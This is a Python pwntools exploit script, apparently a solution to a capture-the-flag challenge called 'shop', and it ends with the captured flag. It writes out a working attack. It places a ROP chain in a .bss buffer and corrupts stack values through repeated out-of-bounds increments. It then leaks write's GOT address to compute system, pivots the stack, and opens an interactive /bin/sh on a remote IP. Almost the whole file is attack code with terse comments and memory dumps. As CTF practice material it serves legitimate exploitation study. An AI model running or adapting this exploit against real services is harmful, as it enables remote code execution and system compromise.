#!/usr/bin/env python
from pwn import *
import time

'''
0xffffcfe4:	0x00000000	0x01000000	0xb32d1600	0xf7fd2000

					     start from -16	local is 0x3c  remote is 0x80
0xffffcff4:	0x00000000	0xf7fd2000	0x0804859e	0x0000003c  ????? 0x80
0xffffd004:	0x08048790	0x08048d0b	0xf7fd2000	0x08048d00
0xffffd014:	0x00000000	0x00000000	0xf7e44a63	0x00000001
0xffffd034:	0xffffd0b4	0xffffd054	0x0804b028	0x080482d8
0xffffd024:	0xffffd0b4	0xffffd0bc	0xf7feacca	0x00000001
0xffffd044:	0xf7fd2000	0x00000000	0x00000000	0x00000000
0xffffd054:	0xc7c5cbc2	0xf0f1cfd2	0x00000000	0x00000000
0xffffd064:	0x00000000	0x00000001	0x080485a0	0x00000000

-16
'''

ret	 = 0x080486e3
pop11ret = 0x08048837
pop_ebp_ret	= 0x08048751
pop_ebx_ret	= 0x08048491
pop_edi_ebp_ret = 0x08048750
leave_ret	= 0x0804859e
credit_name_buf	= 0x0804b120
credit_num_buf	= 0x0804b1e0
mv_eax_ebp_pop_ebx_2_ebp_ret = 0x0804875f
add_eax_edx_jne_0x804862f_ret = 0x08048622
mv_edx_0x0_ret = 0x08048629

def addone(connect,position,times):
	count = times
	r = connect
	while count > 0:
		if count %50 ==0 :
			print count
		res = r.recvuntil('Exit')
		# r.recv()
		# print res[3]
		r.send('a\n')
		# r.recv()
		res = r.recvuntil('MENU.')
		# print res[3]
		r.send(' '+str(position)+'\n')
		count -= 1	

# vdso not work for first try so i change to use the libc 
####################################
# use the libc from other question #
####################################


# since the buffer only has size of 200 not 0x200.
# And the function need about 0x300 (it sub esp in the function )
# So we need to write another chain in the middle of .bss section and pivot to the place 
payload = ''
payload += p32(0x0804b1e0)
#payload += p32(mv_edx_0x0_ret)
#payload += p32(pop_ebp_ret) + p32(11)
#payload += p32(mv_eax_ebp_pop_ebx_2_ebp_ret) + p32(0x0804b120) + p32(0)*2 + p32(0x0804b200)
payload += p32(0x08048530) + p32(0x0804874f) + p32(0x1) + p32(0x804b02c) + p32(0x4)
#	   function in the program  input  ( hiject write with system)
payload += p32(0x080486f0) + p32(0x0804874f) + p32(0x804b02c) + p32(0x8) + p32(0x09)
#	   function in the program  input  ( write rop of system at bss+0x500)		
payload += p32(0x080486f0) + p32(0x0804874f) + p32(0x804b500) + p32(0x20) + p32(0x09)
#	   migration to bss + 0x500 
payload += p32(0x08048751) + p32(0x804b500)
payload += p32(0x0804859e)
#payload += p32(0xf7748cd5)  -> vdso not work

'''
count = 1
while True:
	print 'trying #%d' % count
'''
r = remote('192.168.31.25', 56746)
#r = remote('127.0.0.1', 56746)
#a = raw_input()
#r = process('./shop')
res = r.recvuntil('Exit')
r.send('a\n')
res = r.recvuntil('MENU.')
r.send('1\n')
res = r.recvuntil('Exit')
r.send('c\n')
res = r.recvuntil('):')
r.send('y\n')
res = r.recvuntil('card:')
r.send('/bin/sh\n')

# Step 1 : put the first rop in the Number buffer which has space of 200
res = r.recvuntil('Number:')
r.send(payload+'\n')


# Step 2 : use the vuln and change flow
# 0x0804859e -> 0x080486e3 (ret) 
'''
addone(r,-16,69)
addone(r,-17,1)
'''

# 0x0804859e -> 0x08048751 (pop_ebp_ret) 
addone(r,-16,179)
addone(r,-17,2)


# 0x804882b:	mov    DWORD PTR [esp],0x8048e08
# 0x8048832:	call   0x80486a0
# 0x80	-> 0x804882b
'''
addone(r,-20,171)
addone(r,-21,136)
addone(r,-22,4)
addone(r,-23,8)
'''

# 0x80 -> 0x0804b1e0 (credit_num_buf)
addone(r,-20,96)
addone(r,-21,177)
addone(r,-22,4)
addone(r,-23,8)

# 0x08048790 -> 0x0804859e
addone(r,-24,14)
addone(r,-25,254)

res = r.recvuntil('Exit')
'''
	try:
'''

# Step 3 : trigger the vuln and it will run the rop in the Number buffer
r.send('d\n')

'''
		for i in xrange(7): r.send('ls\n')
		r.send('id\n')
		res = r.recvline_contains('uid')
		print res 
		break
	except:
		r.close()
		count += 1
		continue
print res
'''

# Step 4 : rop will write out the address of write.got. 
# 	   Than calculate the address of system 
res = r.recv()
res = r.recv()
print len(res)
print res.encode('hex')
lib_write = u32(res)
lib_sys = lib_write - 0xd9510 + 0x3fcd0
lib_sys = p32(lib_sys)
print 'sys=',lib_sys.encode('hex')

# Step 5 : send 1.hiject and 2.system
r.send(lib_sys+'\x09')
r.send('A'*4 + p32(0x08048530) + p32(0) + p32(credit_name_buf)+'\x09' )
r.interactive()

#AD{c0N7r0L_r0p_cH41n_CoN7roL_7h3_w0rlD}








